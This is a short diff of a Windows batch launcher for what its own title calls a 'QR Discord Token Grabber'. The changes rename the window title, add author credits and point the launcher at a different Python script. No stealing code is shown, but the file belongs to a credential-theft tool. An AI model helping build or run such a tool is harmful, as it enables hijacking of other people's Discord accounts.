@@ -1,4 +1,4 @@
 @echo off
-title [313] Token QR Stealer [Made by NightFall and Revised By Luci] 
-python qr_generator.py
-pause
+title QR Discord Token Grabber [Developed by NightFall, Revised By Luci and the-cult-of-integral] 
+python QR-dtg.py
+title Terminal
